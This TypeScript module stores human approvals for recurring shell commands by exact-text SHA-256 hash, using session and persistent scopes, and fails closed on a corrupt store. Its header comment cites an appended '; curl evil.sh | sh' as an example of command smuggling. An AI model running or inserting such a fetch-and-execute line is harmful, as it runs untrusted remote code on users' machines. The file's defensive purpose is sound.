// Consent store for command-poll sources.
//
// THE INVARIANT: the daemon spawns a recurring shell command only if a human
// approved THAT EXACT COMMAND TEXT in the browser. Approval identity is the
// sha256 of the command string, so changing so much as a byte — a new flag, a
// different path, an appended `; curl evil.sh | sh` — produces a hash nobody
// approved and the source drops back to pending. There is no wildcard, no
// prefix match, and no "approve this program with any arguments".
//
// Two scopes:
//   Persistent — written to ~/.parchment/approved-commands.json. Survives
//     daemon restarts, which is exactly why it is the one the user must opt
//     into deliberately.
//   Session — held in memory only. A daemon restart forgets it, so a
//     restart-surviving background shell loop can never come from a
//     "just this once" click. This asymmetry is the point of the split.

import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";
import { dirname, join } from "node:path";
import * as z from "zod/v4";
import { STATE_DIR } from "../state.ts";
import { CommandApprovalScope } from "../../shared/types.ts";

export const APPROVED_COMMANDS_FILE = join(STATE_DIR, "approved-commands.json");

// The scope vocabulary lives in shared/types.ts (the browser's approval prompt
// sends it); re-exported so daemon modules import it from their own layer.
export { CommandApprovalScope };

const ApprovedCommandSchema = z.object({
  hash: z.string().min(1),
  command: z.string().min(1),
  approvedAt: z.string().min(1),
});

const ApprovedCommandsFileSchema = z.object({
  version: z.literal(1),
  commands: z.array(ApprovedCommandSchema),
});

export type ApprovedCommand = z.infer<typeof ApprovedCommandsFileSchema>["commands"][number];

const FILE_VERSION = 1;

export function hashCommand(command: string): string {
  return createHash("sha256").update(command, "utf8").digest("hex");
}

// Session approvals never touch disk — see the scope note at the top.
const sessionApprovedHashes = new Map<string, Set<string>>();

export function isCommandApproved(sessionId: string, command: string): boolean {
  const hash = hashCommand(command);
  const approvedForSession = sessionApprovedHashes.get(sessionId)?.has(hash) ?? false;
  if (approvedForSession) return true;
  return listApprovedCommands().some((approved) => approved.hash === hash);
}

export function approveCommand(
  sessionId: string,
  command: string,
  scope: CommandApprovalScope,
): ApprovedCommand {
  const approved: ApprovedCommand = {
    hash: hashCommand(command),
    command,
    approvedAt: new Date().toISOString(),
  };
  if (scope === CommandApprovalScope.Session) {
    rememberForSession(sessionId, approved.hash);
    return approved;
  }
  persistApproval(approved);
  return approved;
}

export function listApprovedCommands(): ApprovedCommand[] {
  return loadApprovedCommandsFrom(APPROVED_COMMANDS_FILE);
}

// A corrupt or unreadable store approves NOTHING. Failing closed here means a
// truncated write can cost the user a re-approval click; failing open would
// mean a truncated write silently unlocks every command in the file.
export function loadApprovedCommandsFrom(file: string): ApprovedCommand[] {
  if (!existsSync(file)) return [];
  try {
    const parsed = ApprovedCommandsFileSchema.safeParse(JSON.parse(readFileSync(file, "utf8")));
    if (!parsed.success) return [];
    return parsed.data.commands;
  } catch {
    return [];
  }
}

function rememberForSession(sessionId: string, hash: string): void {
  const existing = sessionApprovedHashes.get(sessionId);
  if (existing) {
    existing.add(hash);
    return;
  }
  sessionApprovedHashes.set(sessionId, new Set([hash]));
}

function persistApproval(approved: ApprovedCommand): void {
  const existing = loadApprovedCommandsFrom(APPROVED_COMMANDS_FILE);
  const withoutDuplicate = existing.filter((candidate) => candidate.hash !== approved.hash);
  const commands = [...withoutDuplicate, approved];
  mkdirSync(dirname(APPROVED_COMMANDS_FILE), { recursive: true });
  writeFileSync(
    APPROVED_COMMANDS_FILE,
    `${JSON.stringify({ version: FILE_VERSION, commands }, null, 2)}\n`,
  );
}
